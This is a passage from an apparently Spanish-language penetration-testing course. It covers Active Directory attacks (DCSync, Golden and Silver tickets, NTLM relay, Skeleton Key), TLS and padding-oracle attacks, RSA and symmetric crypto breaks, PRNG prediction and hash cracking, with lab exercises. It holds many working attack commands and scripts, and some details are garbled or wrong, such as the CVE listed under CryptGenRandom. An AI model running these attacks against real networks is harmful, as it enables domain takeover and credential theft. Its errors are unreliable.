Simula replicación de DC. Usa DRSUAPI.

```bash
impacket-secretsdump -dc-ip 192.168.1.100 dominio.local/admin:pass@192.168.1.100
impacket-secretsdump -just-dc-user krbtgt dominio.local/admin:pass@192.168.1.100
impacket-secretsdump -hashes LM:NTLM dominio.local/admin@192.168.1.100
```

```cmd
mimikatz # lsadump::dcsync /domain:dominio.local /user:krbtgt
```

### 5.7 Ejercicios prácticos

**Ejercicio 1:** Configurá AD lab con 2 DCs y 3 usuarios (1 sin preauth). Hacé AS-REP Roasting.

**Ejercicio 2:** Creá cuenta de servicio con SPN. Hacé Kerberoasting y crackeá el hash.

**Ejercicio 3:** Hacé DCSync, obtené KRBTGT, creá Golden Ticket para "HackerAdmin".

**Ejercicio 4:** Accedé a `\\DC\C$` con el Golden Ticket usando smbclient.

**Ejercicio 5:** Creá Silver Ticket para CIFS. Accedé al recurso compartido.

**Ejercicio 6:** Cream Diamond Ticket con Rubeus. ¿Es detectable?

**Ejercicio 7:** Configurá monitoreo de DCSync (evento 4662). Hacé DCSync y revisá logs.

---

## 6. NTLM Relay Attacks

### 6.1 [responder](../raw/w1nd0ws-p0st3xpl01t.md#responder) — El cazador de hashes

Envenena [llmnr](../raw/w1nd0ws-p0st3xpl01t.md#llmnr-nbt-ns), [nbt-ns](../raw/w1nd0ws-p0st3xpl01t.md#llmnr-nbt-ns) y MDNS.

```bash
responder -I eth0 -rdwv
```

Los hashes se guardan en `/usr/share/responder/logs/`.

```bash
hashcat -m 5600 responder_ntlmv2.txt rockyou.txt
```

### 6.2 ntlmrelayx — El relay

Toma hashes y los reenvía a otro servidor.

```bash
impacket-ntlmrelayx -tf targets.txt -smb2support
```

### 6.3 [smb relay](../raw/w1nd0ws-p0st3xpl01t.md#smb-relay)

Requiere [smb](../raw/w1nd0ws-p0st3xpl01t.md#smb) Signing deshabilitado.

```bash
nmap --script smb2-security-mode -p445 192.168.1.0/24
```

```bash
echo "192.168.1.101" > targets.txt
impacket-ntlmrelayx -tf targets.txt -smb2support -socks
responder -I eth0 -rdwv
```

### 6.4 [http](../raw/r3d3s-f0nd4m3nt0s.md#http) Relay

```bash
impacket-ntlmrelayx -tf targets.txt -smb2support
impacket-ntlmrelayx -tf targets.txt -http
```

### 6.5 LDAP Relay

Peligroso porque LDAP no verifica integridad.

```bash
impacket-ntlmrelayx -tf targets.txt -ldap -escalate-user administrador
```

### 6.6 Relaying to [ad](../raw/w1nd0ws-d0m41n-4dm1n.md) CS

ESC8 — AD CS NTLM Relay.

```bash
crackmapexec ldap 192.168.1.100 -d dominio.local -u user -p pass -M adcs
impacket-ntlmrelayx -t http://CA-SERVER/certsrv/ -smb2support -adcs
```

```bash
impacket-getTGT -pfx certificado.pfx dominio.local/usuario -dc-ip 192.168.1.100
```

### 6.7 Ejercicios prácticos

**Ejercicio 1:** Configurá lab con Windows Server y 2 clientes. Deshabilitá SMB Signing en uno. Capturá [hash](../raw/crypt0-f0r-h4ck3rs.md#hash-functions) y relayealo.

**Ejercicio 2:** Escaneá servidores con SMB Signing deshabilitado usando [nmap](../raw/nm4p.md).

**Ejercicio 3:** Simulá relay HTTP → SMB con autenticación Windows Integrada.

**Ejercicio 4:** Configurá AD CS. Hacé relay y obtené certificado. Usalo para TGT.

**Ejercicio 5:** Probá modo socks de ntlmrelayx. Mantené sesión abierta.

**Ejercicio 6:** Investigá detección de relay. ¿Qué logs? ¿Contramedidas?

**Ejercicio 7:** Relay a LDAP con escalación de privilegios.

---

## 7. [tls](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls) Attack Surface

### 7.1 Certificate Validation Bypass

```python
# VULNERABLE
import requests
requests.get('https://example.com', verify=False)

import ssl
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
```

```java
// VULNERABLE Java
TrustManager[] trustAllCerts = new TrustManager[] { ... };
SSLContext sc = SSLContext.getInstance("SSL");
sc.init(null, trustAllCerts, new java.security.SecureRandom());
```

```javascript
// VULNERABLE Node.js
process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
```

Explotación:
```bash
mitmproxy --listen-port 8080 --ssl-insecure
```

### 7.2 Self-Signed Cert Exploits

```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/CN=*.microsoft.com"
```

### 7.3 STARTTLS Stripping

```python
from scapy.all import *
def block_starttls(pkt):
    if pkt.haslayer(Raw) and b'STARTTLS' in pkt[Raw].load:
        return
    send(pkt)
sniff(filter="port 25", prn=block_starttls)
```

### 7.4 ALPACA Attack

Confusión de [protocolo](../raw/r3d3s-f0nd4m3nt0s.md#protocolos-de-red)) de aplicación sobre TLS.

### 7.5 TLS 1.0/1.1 Downgrade

```bash
curl --tlsv1.0 https://vulnerable-server.com
openssl s_client -connect server.com:443 -tls1
nmap --script ssl-enum-ciphers -p 443 vulnerable-server.com
testssl.sh --protocols vulnerable-server.com:443
```

### 7.6 ROBOT Attack

Bleichenbacher revival.

```bash
testssl.sh --robot vulnerable-server.com:443
```

### 7.7 POODLE

Padding oracle sobre SSLv3/TLS 1.0 CBC.

```bash
testssl.sh --poodle vulnerable-server.com:443
```

### 7.8 BEAST

IV predecible en TLS 1.0 CBC.

### 7.9 CRIME

Compresión TLS.

```bash
testssl.sh --crime vulnerable-server.com:443
```

### 7.10 BREACH

Compresión [http](../raw/r3d3s-f0nd4m3nt0s.md#http).

```bash
curl -H "Accept-Encoding: gzip" "https://example.com/?secret=S" --compressed -o /dev/null -w %{size_download}
```

### 7.11 HEARTBLEED

[cve](../raw/s3c-f0nd4m3nt0s.md#cve)-2014-0160. Lectura de memoria de OpenSSL.

```bash
nmap -sV -p 443 --script ssl-heartbleed vulnerable-server.com
python2 heartbleed.py vulnerable-server.com -p 443 -n 100
```

```python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("target", 443))
s.send(b'\x16\x03\x02\x00\x31\x01...')
s.recv(4096)
s.send(b'\x18\x03\x02\x00\x03\x01\x40\x00')
resp = s.recv(4096)
print(f"Leaked {len(resp)} bytes")
```

### 7.12 Ejercicios prácticos

**Ejercicio 1:** Escaneá 10 servidores con testssl.sh. ¿Cuántos soportan TLS 1.0? ¿ROBOT?

**Ejercicio 2:** Configurá Apache/NGINX con TLS 1.0/1.1/1.2. Hacé downgrade.

**Ejercicio 3:** Probá ALPACA en tu lab.

**Ejercicio 4:** Creá script que detecte STARTTLS stripping.

**Ejercicio 5:** Configurá [docker](../raw/d0ck3r-f0r-h4ck3rs.md) con HEARTBLEED y explotalo.

**Ejercicio 6:** Creá app que no valida certificados. Hacé [mitm](../raw/m1tm-m0b1l3.md) con mitmproxy.

---

## 8. Padding Oracle Attacks

### 8.1 Cómo funcionan los padding oracle

CBC con PKCS#7 padding. El servidor revela si el padding es válido o no.

#### CBC Decryption:
```
P1 = D(C1, K) XOR IV
P2 = D(C2, K) XOR C1
```

#### PKCS#7 Padding:
- Faltan 1 byte: `\x01`
- Faltan 2 bytes: `\x02\x02`
- Faltan 3 bytes: `\x03\x03\x03`

#### El ataque:
1. Modificás Cn-1 byte por byte.
2. Si el padding del último bloque es válido, sabés el valor descifrado.
3. Repetís hasta descifrar todo.

### 8.2 Padbuster

```bash
padbuster http://target.com/login.php "ciphertext_b64" 16 -cookies "auth=ciphertext"
padbuster http://target.com/login.php "ct" 16 -encoding 0
padbuster http://target.com/login.php "ct" 16 -plaintext "admin=1"
```

### 8.3 Poracle

```bash
poracle --ciphertext "b64_ct" --url "http://target.com" --param "data" --blocksize 16
poracle --ciphertext "b64_ct" --url "http://target.com" --param "data" --plaintext "admin=1"
```

#### Padding oracle en [python](../raw/pyth0n-f0r-h4ck1ng.md)

```python
import requests, base64

def oracle(ct_b64):
    r = requests.post(TARGET, data={"token": ct_b64})
    return "Invalid padding" not in r.text

def padding_oracle_decrypt(ct_b64, bs=16):
    ct = base64.b64decode(ct_b64)
    blocks = [ct[i:i+bs] for i in range(0, len(ct), bs)]
    plaintext = b""

    for block_num in range(len(blocks)):
        target = blocks[block_num]
        fake_iv = bytearray(bs)

        for byte_pos in range(bs):
            pad = byte_pos + 1
            for k in range(byte_pos):
                fake_iv[bs-1-k] = pad ^ plaintext[bs-1-k]

            for guess in range(256):
                fake_iv[bs-1-byte_pos] = guess
                payload = base64.b64encode(bytes(fake_iv) + target).decode()

                if oracle(payload):
                    plaintext = bytes([guess ^ pad]) + plaintext
                    break

    padding_len = plaintext[-1]
    return plaintext[:-padding_len]
```

### 8.4 CBC-MAC Confusion

Misma clave para [cifrado](../raw/s3c-f0nd4m3nt0s.md#cifrado) y MAC.

### 8.5 ASP.NET Padding Oracle

```python
import requests, re
r = requests.get("http://target.com/page.aspx")
match = re.search(r'id="__VIEWSTATE" value="([^"]+)"', r.text)
viewstate = match.group(1)
```

### 8.6 Ejercicios prácticos

**Ejercicio 1:** Creá servidor Python vulnerable a padding oracle. Implementá CBC con PKCS#7.

**Ejercicio 2:** Explotá con padbuster. Descifrá y cifrá.

**Ejercicio 3:** Escribí tu propio padding oracle en Python.

**Ejercicio 4:** Modificá el servidor para mismo error siempre. ¿Sigue siendo explotable?

**Ejercicio 5:** CBC Bit Flipping. Modificá ciphertext sin romper padding.

**Ejercicio 6:** Probá contra ASP.NET [legacy](../raw/l3g4cy-3nt3rpr1s3.md) en tu lab.

---

## 9. Known Attacks on Symmetric Crypto

### 9.1 ECB Byte-at-a-Time

ECB cifra cada bloque independientemente.

```python
def detect_blocksize():
    base = len(oracle(b""))
    for i in range(1, 32):
        if len(oracle(b"A" * i)) > base:
            return len(oracle(b"A" * i)) - base

def detect_ecb():
    ct = oracle(b"A" * 64)
    return ct[0:16] == ct[16:32]
```

#### Byte-at-a-Time Decryption:
1. Creá padding para desplazar el byte desconocido.
2. Comparamos bloques para descifrar byte por byte.

#### Cut-and-Paste:
Reorganizá bloques ECB para crear contenido diferente.

### 9.2 CBC Bit Flipping

Modificás C1 para cambiar P2.

```python
def cbc_bit_flip(ct, block_num, byte_pos, original_pt, desired_pt, iv=None):
    ct = bytearray(ct)
    if block_num == -1:
        iv = bytearray(iv)
        iv[byte_pos] ^= original_pt[byte_pos] ^ desired_pt[byte_pos]
        return bytes(iv), None
    else:
        start = block_num * 16
        ct[start + byte_pos] ^= original_pt[byte_pos] ^ desired_pt[byte_pos]
        return None, bytes(ct)
```

### 9.3 CTR Nonce Reuse

Mismo nonce = mismo keystream = C1 XOR [c2](../raw/r3v3rs3-sh3lls.md#command-and-control) = P1 XOR P2.

```python
def crib_drag(c1, c2):
    xor_ct = bytes(x ^ y for x, y in zip(c1, c2))
    cribs = [b"the ", b"password", b"secret", b"key "]
    for crib in cribs:
        for i in range(len(xor_ct) - len(crib) + 1):
            chunk = xor_ct[i:i+len(crib)]
            possible = bytes(x ^ y for x, y in zip(chunk, crib))
            if all(32 <= b < 127 for b in possible):
                print(f"Pos {i}: '{possible.decode()}'")
```

### 9.4 [aes](../raw/crypt0-f0r-h4ck3rs.md#aes)-GCM Nonce Reuse

Peor que CTR: perdés confidencialidad Y autenticación.

### 9.5 Ejercicios prácticos

**Ejercicio 1:** Implementá oráculo AES-ECB. Hacé byte-at-a-time attack.

**Ejercicio 2:** Servidor que cifra cookies con CBC. Hacé bit flipping para cambiar user→admin.

**Ejercicio 3:** Simulá nonce reuse en CTR. 3 mensajes, implementá crib dragging.

**Ejercicio 4:** GCM nonce reuse. Recuperá clave de autenticación.

**Ejercicio 5:** Investigá cómo detectar nonce reuse.

**Ejercicio 6:** Creá WAF que detecte bit flipping en cookies.

---

## 10. Known Attacks on Asymmetric Crypto

### 10.1 [rsa](../raw/crypt0-f0r-h4ck3rs.md#rsa) Small e — Hastad Attack

e=3, mismo mensaje a 3 personas.

```python
import gmpy2
from Crypto.Util.number import long_to_bytes

def hastad(ciphertexts, moduli, e=3):
    def crt(remainders, moduli):
        M = 1
        for m in moduli: M *= m
        result = 0
        for a, m in zip(remainders, moduli):
            Mi = M // m
            inv = gmpy2.invert(Mi, m)
            result = (result + a * Mi * inv) % M
        return result

    M_e = crt(ciphertexts, moduli)
    M = gmpy2.iroot(M_e, e)
    return long_to_bytes(M[0]) if M[1] else None
```

### 10.2 Wiener Attack — d muy chico

d < N^0.25. Usa fracciones continuas.

```python
def wiener(e, n):
    cf = []
    num, den = e, n
    while den:
        q = num // den; cf.append(q)
        num, den = den, num - q * den

    n0, n1, d0, d1 = 0, 1, 1, 0
    for a in cf:
        n2, d2 = a * n1 + n0, a * d1 + d0
        n0, n1, d0, d1 = n1, n2, d1, d2
        if d2 == 0: continue
        phi = (e * d2 - 1) // n2
        b = n - phi + 1
        disc = b*b - 4*n
        if disc > 0:
            sqrt = gmpy2.isqrt(disc)
            if sqrt*sqrt == disc:
                return d2, (b + sqrt)//2, (b - sqrt)//2
    return None, None, None
```

### 10.3 Common Modulus Attack

Mismo N, diferentes e coprimos.

```python
def common_modulus(c1, c2, e1, e2, n):
    def egcd(a, b):
        if a == 0: return b, 0, 1
        g, x, y = egcd(b % a, a)
        return g, y - (b//a)*x, x
    g, s1, s2 = egcd(e1, e2)
    if s1 < 0:
        c1_inv = gmpy2.invert(c1, n)
        m = (pow(c1_inv, -s1, n) * pow(c2, s2, n)) % n
    else:
        c2_inv = gmpy2.invert(c2, n)
        m = (pow(c1, s1, n) * pow(c2_inv, -s2, n)) % n
    return long_to_bytes(m)
```

### 10.4 RSA Blinding Attack

Homomorfismo: E(M1) * E(M2) = E(M1 * M2).

```python
def rsa_blinding(server_sign, target_msg, e, n):
    r = random.randint(2, n-1)
    blind = (target_msg * pow(r, e, n)) % n
    blind_sig = server_sign(blind)
    r_inv = gmpy2.invert(r, n)
    return (blind_sig * r_inv) % n
```

### 10.5 RSA Fault Attacks

Bellcore Attack: error en una exponenciación CRT permite factorizar N.

### 10.6 ECC — Invalid Curve Attack

Enviar puntos que no están en la curva. El servidor hace cálculos con coordenadas pero no verifica que el punto esté en la curva.

```python
# Enviar punto (x, y) que no satisface y^2 = x^3 + ax + b
# Si la curva no verifica, el cálculo usa una curva diferente con orden débil
```

### 10.7 ECC — Twist Security

La "twist" de una curva (y^2 = x^3 + d^2*ax + d^3*b) puede tener orden débil. Algunas implementaciones no verifican que el punto esté en la curva original.

### 10.8 Ejercicios prácticos

**Ejercicio 1:** Generá 3 pares RSA con e=3. Cifrá el mismo mensaje. Hacé Hastad attack.

**Ejercicio 2:** Generá RSA con d chico (d < N^0.25). Hacé Wiener attack.

**Ejercicio 3:** Common Modulus Attack: mismo N, dos e coprimos.

**Ejercicio 4:** Simulá un servidor de firma ciega. Hacé blinding attack.

**Ejercicio 5:** Investigá curvas ECC con invalid curve. Probá con una implementación vulnerable.

---

## 11. [hash](../raw/crypt0-f0r-h4ck3rs.md#hash-functions) Length Extension Attack

### 11.1 ¿Cómo funciona?

Ataca construcciones H(secreto || mensaje). Sin conocer el secreto, podés extender el hash:

H(secreto || mensaje || padding || extension)

```python
# SHA1: H = H(secreto || mensaje)
# Sabemos: H(secreto || mensaje)
# No sabemos: secreto
# Podemos calcular: H(secreto || mensaje || padding || extension)
```

### 11.2 Hashpumpy

```python
import hashpumpy

# Hash original: MD5(secreto || "data")
original_hash = "hash_del_original"
original_data = b"data"
secret_len = 8  # hay que adivinarlo

# Extender
new_hash, new_data = hashpumpy.hashpumpy(
    original_data, original_data + b"extra", secret_len, b"extra_data",
    algorithm="md5"
)
```

### 11.3 Explotando esquemas de firma vulnerables

```python
# Esquema vulnerable: token = MD5(secret + message)
# Después: verify(token, message) -> MD5(secret + message) == token?
# Con hashpumpy podemos crear token para messages que nunca autorizó el server
```

### 11.4 Ejercicios prácticos

**Ejercicio 1:** Implementá un servidor que verifica H(secret || data) == hash. Hacé hash length extension.

**Ejercicio 2:** Probá con SHA1 y SHA256 (OJO: SHA256 también es vulnerable a HLE).

**Ejercicio 3:** Creá un [exploit](../raw/m3t4spl01t.md#exploits) para una API que usa H(secret || admin=0) para autorización. Extendelo a "admin=1".

---

## 12. Weak PRNG / Entropy

### 12.1 Prediciendo números aleatorios

Si conocés unos pocos outputs de un PRNG lineal, podés predecir los siguientes.

### 12.2 PHP rand()

```php
// PHP 5: LCG lineal
// state = (state * 1103515245 + 12345) % 2^31
// Con 2 valores consecutivos, recuperás el estado
```

```python
def php_rand_predict(v1, v2):
    # v1 = (state * 1103515245 + 12345) & 0x7fffffff
    # v2 = (next_state * 1103515245 + 12345) & 0x7fffffff
    state = (v1 * 1103515245 + 12345) & 0x7fffffff
    predicted = (state * 1103515245 + 12345) & 0x7fffffff
    return predicted == v2
```

### 12.3 Java Random

```java
// Linear congruential: state = (state * 25214903917 + 11) & 0xffffffffffff
// 48-bit state, output = state >> 16 (32 bits)
```

```python
def java_predict(v1, v2):
    # Java Random: 48-bit state, output es upper 32 bits
    # state = (state * 25214903917 + 11) & (2^48 - 1)
    # nextInt() = state >> 16
    pass
```

### 12.4 glibc random

```c
// glibc random() usa un LFSR (Linear Feedback Shift Register) de 31 enteros
// Con 32 salidas consecutivas, recuperás el estado completo
```

### 12.5 Windows CryptGenRandom

```python
# CryptGenRandom en Windows usa múltiples fuentes de entropía
# Es considerado seguro, pero ha tenido bugs (CVE-2017-0143, Dual_EC_DRBG)
```

### 12.6 Ejercicios prácticos

**Ejercicio 1:** Capturá 3 outputs de PHP rand(). Recuperá el estado interno.

**Ejercicio 2:** Implementá predictor de Java Random.

**Ejercicio 3:** Investigá el bug de glibc random en contenedores [docker](../raw/d0ck3r-f0r-h4ck3rs.md).

---

## 13. Crypto Mining and Coin Analysis

### 13.1 Transaction Graph Analysis

Cada transacción en [blockchain](../raw/w3b3-sm4rt-c0ntr4cts.md#blockchain) es pública. Con análisis de grafos podés rastrear fondos.

```python
# Construir grafo de transacciones
# Nodos: direcciones
# Aristas: transacciones
# Buscar patrones: mixing, tumbled transactions
```

### 13.2 Blockchain Analysis

Herramientas:
- Blockchair
- Chainalysis
- CipherTrace
- OXT (oxt.me)

```bash
# Analizar dirección
curl https://blockchain.info/address/1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa?format=json
```

### 13.3 Wallet Clustering

Agrupar direcciones que probablemente pertenecen a la misma entidad.

```python
# Heurísticas de clustering:
# 1. Inputs de una misma tx pertenecen al mismo wallet
# 2. Change addresses (output que vuelve al emisor)
# 3. Patrones de gasto
```

### 13.4 CoinJoin Analysis

CoinJoin mezcla transacciones de múltiples usuarios. Pero no es perfecto.

```python
# Análisis de CoinJoin:
# 1. Identificar transacciones CoinJoin (mismos outputs)
# 2. Usar heurísticas de denominaciones
# 3. Análisis de temporalidad
# 4. Sudoku (pares de inputs/outputs)
```

### 13.5 Ejercicios prácticos

**Ejercicio 1:** Analizá una transacción de Bitcoin en blockchair.[com](../raw/w1n-s9bsyst3ms.md#com). Seguí los fondos 3 saltos.

**Ejercicio 2:** Implementá un clusterizador de wallets simple usando heurística de multi-input.

**Ejercicio 3:** Identificá una transacción CoinJoin. Intentá desanomimizarla.

**Ejercicio 4:** Investigá cómo Chainalysis etiqueta direcciones sospechosas.

---

## 14. Apéndice A — Referencia rápida de comandos

### [hashcat](../raw/p4ssw0rd-4tt4cks.md#hashcat)

```bash
hashcat -m MODO -a 0 hashes.txt wordlist.txt
hashcat -m MODO -a 0 hashes.txt wordlist.txt -r rule.rule
hashcat -m MODO -a 1 hashes.txt w1.txt w2.txt
hashcat -m MODO -a 3 hashes.txt ?u?l?l?d?d?d
hashcat -m MODO -a 6 hashes.txt wordlist.txt ?d?d
hashcat -m MODO -a 7 hashes.txt ?u?u?u wordlist.txt
hashcat -m MODO -a 8 hashes.txt wordlist.txt
hashcat --stdout wordlist.txt -r rule.rule
```

### Modos hashcat comunes

| Algoritmo | Modo | Velocidad relativa |
|-----------|------|-------------------|
| MD5 | 0 | Máxima |
| NTLM | 1000 | Máxima |
| LM | 3000 | Máxima |
| SHA1 | 100 | Alta |
| SHA256 | 1400 | Alta |
| SHA512 | 1700 | Media |
| bcrypt | 3200 | Baja |
| sha256crypt | 7400 | Media |
| sha512crypt | 1800 | Media |
| NTLMv2 | 5600 | Alta |
| Kerberos AS-REP | 18200 | Alta |
| Kerberos TGS-REP | 13100 | Alta |
| WPA/[wpa2](../raw/w1f1-4tt4cks.md#wpa2) | 2500 | Baja (CPU) |

### [hydra](../raw/p4ssw0rd-4tt4cks.md#hydra)

```bash
hydra -l user -P pass.txt ssh://target
hydra -l user -P pass.txt http-post-form "/login:user=^USER^&pass=^PASS^:F=fail"
hydra -L users.txt -P pass.txt ftp://target
```

### Impacket

```bash
impacket-GetNPUsers -dc-ip IP -request domain/user
impacket-GetUserSPNs -dc-ip IP -request domain/user:pass
impacket-secretsdump -dc-ip IP domain/admin:pass@IP
impacket-ticketer -nthash HASH -domain-sid SID -domain DOMAIN user
```

---

## 15. Apéndice B — Wordlists recomendadas

- **rockyou.txt** — 14M contraseñas reales. La base de todo.
- **SecLists/Passwords** — Colección curada por Daniel Miessler.
- **crackstation.txt** — 15GB de wordlists combinadas.
- **weakpass.[com](../raw/w1n-s9bsyst3ms.md#com)** — Wordlists por categorías.
- **hashes.org** — Hashes crackeados públicos.
- **LinkedIn leak** — 6.5M contraseñas reales.
- **Collection #1-#5** — Grandes breaches combinados.

## 16. Apéndice C — Glosario

- **AS-REP**: Authentication Server Response (Kerberos)
- **AS-REQ**: Authentication Server Request (Kerberos)
- **CBC**: Cipher Block Chaining
- **CRT**: Chinese Remainder Theorem
- **CTR**: Counter mode
- **DC**: [domain controller](../raw/w1nd0ws-d0m41n-4dm1n.md#domain-controller)
- **[dcsync](../raw/w1nd0ws-d0m41n-4dm1n.md#dcsync)**: Domain Controller Synchronization
- **ECB**: Electronic Codebook
- **GCM**: Galois/Counter Mode
- **KDC**: Key Distribution Center
- **KRBTGT**: Kerberos Ticket Granting Ticket account
- **[llmnr](../raw/w1nd0ws-p0st3xpl01t.md#llmnr-nbt-ns)**: Link-Local Multicast Name Resolution
- **LM**: LAN Manager [hash](../raw/crypt0-f0r-h4ck3rs.md#hash-functions)
- **MAC**: Message Authentication Code
- **[mitm](../raw/m1tm-m0b1l3.md)**: Man In The Middle
- **[nbt-ns](../raw/w1nd0ws-p0st3xpl01t.md#llmnr-nbt-ns)**: NetBIOS Name Service
- **NTLM**: NT LAN Manager
- **PAC**: Privilege Attribute Certificate
- **PRNG**: Pseudo-Random Number Generator
- **[rsa](../raw/crypt0-f0r-h4ck3rs.md#rsa)**: Rivest-Shamir-Adleman
- **[smb](../raw/w1nd0ws-p0st3xpl01t.md#smb)**: Server Message Block
- **SPN**: Service Principal Name
- **TGS**: Ticket Granting Service
- **TGT**: Ticket Granting Ticket
- **[tls](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls)**: Transport Layer Security


## 17. Extended Content — [cryptography](../raw/crypt0-f0r-h4ck3rs.md) Deep Dives

### 17.1 Advanced [hash](../raw/crypt0-f0r-h4ck3rs.md#hash-functions) [cracking](../raw/p4ssw0rd-4tt4cks.md#cracking-de-contrasenas) Strategies

#### Priority-based cracking

Not all hashes are equal. When you have a batch of hashes, prioritize:

1. **NTLM hashes first** (fastest, mode 1000)
2. **MD5 hashes** (mode 0, almost as fast)
3. **SHA1 hashes** (mode 100)
4. **bcrypt/scrypt/Argon2 last** (slow, need focused approach)

```bash
# Extract NTLM hashes from a dump
grep -oP '\$NT\$[^:]+' dump.txt > ntlm_only.txt

# Sort by hash type for efficient cracking
hashid -m hashes.txt > hash_types.txt
```

#### Using --potfile and --show

```bash
# The potfile stores all previously cracked hashes
# You never need to crack the same hash twice

# Show already cracked
hashcat -m 1000 --show hashes.txt

# New cracking attempt skips already cracked ones automatically
hashcat -m 1000 -a 0 hashes.txt rockyou.txt
```

#### Loop cracking strategy

```bash
# Phase 1: Straight dictionary
hashcat -m 1000 -a 0 hashes.txt rockyou.txt -O

# Phase 2: Dictionary with best64
hashcat -m 1000 -a 0 hashes.txt rockyou.txt -r best64.rule -O

# Phase 3: Dictionary with dive
hashcat -m 1000 -a 0 hashes.txt rockyou.txt -r dive.rule -O

# Phase 4: PRINCE
hashcat -m 1000 -a 8 hashes.txt rockyou.txt -O

# Phase 5: Mask attack 8 chars
hashcat -m 1000 -a 3 hashes.txt ?a?a?a?a?a?a?a?a -i -O
```

### 17.2 GPU Optimization for [hashcat](../raw/p4ssw0rd-4tt4cks.md#hashcat)

#### Benchmark your hardware

```bash
# Benchmark all hash types
hashcat -b

# Benchmark specific type
hashcat -b -m 1000

# Benchmark with specific device
hashcat -b -m 1000 -D 2
```

#### Device management

```bash
# List devices
hashcat -I

# Select specific devices
hashcat -m 1000 -a 0 hashes.txt rockyou.txt -d 1,2

# Use only CPU (for slow hashes)
hashcat -m 3200 -a 0 hashes.txt rockyou.txt -D 1
```

#### Workload profiles

```bash
# --workload-profile (or -w):
# 1 = Low (2 threads, minimal GPU)
# 2 = Default
# 3 = High (uses more resources)
# 4 = Nightmare (max GPU, may freeze UI)

hashcat -m 1000 -a 0 hashes.txt rockyou.txt -w 4
```

#### Optimized kernels (-O)

```bash
# -O enables optimized kernels (faster but fewer password lengths)
# Max password length depends on algorithm:
# MD5: 15 chars, SHA1: 15 chars, bcrypt: 55 chars
hashcat -m 1000 -a 0 hashes.txt rockyou.txt -O
```

#### Segmentation for large wordlists

```bash
# Split rockyou for memory management
split -l 1000000 rockyou.txt rockyou_chunk_

# Crack each chunk
for chunk in rockyou_chunk_*; do
    hashcat -m 1000 -a 0 hashes.txt "$chunk"
done
```

### 17.3 Advanced Kerberos — Bronze Bit & Skeleton Key

#### Bronze Bit ([cve](../raw/s3c-f0nd4m3nt0s.md#cve)-2020-17049)

The Bronze Bit attack forges a forwardable TGT. Normally, only some tickets are forwardable. With Bronze Bit, you can make any TGT forwardable.

```bash
# Check if domain is vulnerable
impacket-rbcd -action check -delegate-to DC$ -delegate-from HACKER$ domain/user:pass

# Exploit with modified KDC
# Requires modified KDC or specific tooling
```

#### Skeleton Key

A Skeleton Key is a malware technique for [active directory](../raw/w1nd0ws-d0m41n-4dm1n.md). It patches the LSASS process on a [domain controller](../raw/w1nd0ws-d0m41n-4dm1n.md#domain-controller) to accept a master password.

```cmd
# Inject skeleton key on DC
mimikatz # misc::skeleton

# Now any account can log in with the skeleton key password
# Works until DC reboot
```

### 17.4 Advanced [tls](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls) — 0-RTT & Raccoon Attack

#### TLS 1.3 0-RTT

0-RTT (Zero Round Trip Time) allows sending data immediately after the ClientHello, before the [handshake](../raw/w1f1-4tt4cks.md#handshake) completes. This is vulnerable to replay attacks.

```bash
# Test 0-RTT support
testssl.sh --early-data vulnerable-server.com:443
```

#### Raccoon Attack (CVE-2020-1968)

A timing side-channel on DH key exchange in TLS 1.2.

```bash
testssl.sh --raccoon vulnerable-server.com:443
```

### 17.5 Advanced [rsa](../raw/crypt0-f0r-h4ck3rs.md#rsa) — Fermat & Pollard p-1

#### Fermat Factorization

If p and q are close together (|p - q| < N^0.25), Fermat factorization works.

```python
def fermat_factor(n):
    a = gmpy2.isqrt(n)
    if a * a < n: a += 1
    b2 = a * a - n
    while not gmpy2.is_square(b2):
        a += 1
        b2 = a * a - n
    b = gmpy2.isqrt(b2)
    return a - b, a + b
```

#### Pollard p-1

If p-1 has only small prime factors:

```python
def pollard_p1(n, B=1000000):
    a = 2
    for j in range(2, B):
        a = pow(a, j, n)
        d = gmpy2.gcd(a - 1, n)
        if 1 < d < n:
            return d
    return None
```

### 17.6 Side-Channel Attacks on Crypto

#### Timing Attacks

Different operations take different times depending on the key:

```python
import time

def timing_attack(oracle, guess):
    times = []
    for _ in range(100):
        start = time.perf_counter()
        result = oracle(guess)
        end = time.perf_counter()
        times.append(end - start)
    return sum(times) / len(times)
```

#### Cache-Timing (Flush+Reload)

Monitor cache misses to infer secret-dependent memory access patterns.

```python
# Concept: Flush a cache line, wait, check if it's reloaded
# If reloaded, the victim accessed that memory = key-dependent
```

#### Power Analysis (SPA/DPA)

Simple Power Analysis: the power trace reveals operations.
Differential Power Analysis: statistical analysis of power traces.

### 17.7 Quantum Computing Threats

#### Shor's Algorithm

Shor factors RSA in polynomial time on a quantum computer.

- RSA-2048: ~8 hours with 20M qubits (estimated)
- RSA-4096: ~2 days
- Current quantum computers: ~100-1000 qubits (noisy)

#### Grover's Algorithm

Grover reduces [aes](../raw/crypt0-f0r-h4ck3rs.md#aes) key search from O(2^n) to O(2^(n/2)):
- AES-128: ~2^64 operations (breakable)
- AES-256: ~2^128 operations (still safe)

#### [post-quantum](../raw/pqc-s1d3-ch4nn3ls.md)-s1d3-ch4nn3ls.md) Cryptography

[nist](../raw/p3nt3st-m3th0d0l0gy.md#nist) standards (2024):
- **CRYSTALS-Kyber** (key exchange) → ML-KEM
- **CRYSTALS-Dilithium** (signatures) → ML-DSA
- **SPHINCS+** (signatures) → SLH-DSA
- **FALCON** (signatures) → FN-DSA

### 17.8 Practical Lab Setup

#### [docker](../raw/d0ck3r-f0r-h4ck3rs.md) for crypto labs

```dockerfile
FROM kalilinux/kali-rolling
RUN apt-get update && apt-get install -y hashcat hydra responder impacket-scripts python3-pip
RUN pip3 install pycryptodome pwntools requests gmpy2 hashpumpy
```

```bash
docker build -t crypto-lab .
docker run -it crypto-lab /bin/bash
```

#### Vulnerable machines for practice

- **[hackthebox](../raw/ctf-h4ckth3b0x.md#hackthebox)-h4ckth3b0x.md#[hackthebox](../raw/ctf-h4ckth3b0x.md#hackthebox)):** Access, Forest, Blackfield (Kerberos)
- **[tryhackme](../raw/ctf-h4ckth3b0x.md#tryhackme):** Cryptography for Hackers, Hash cracking
- **PentesterLab:** Cryptographic failures
- **VulnHub:** Various crypto challenges
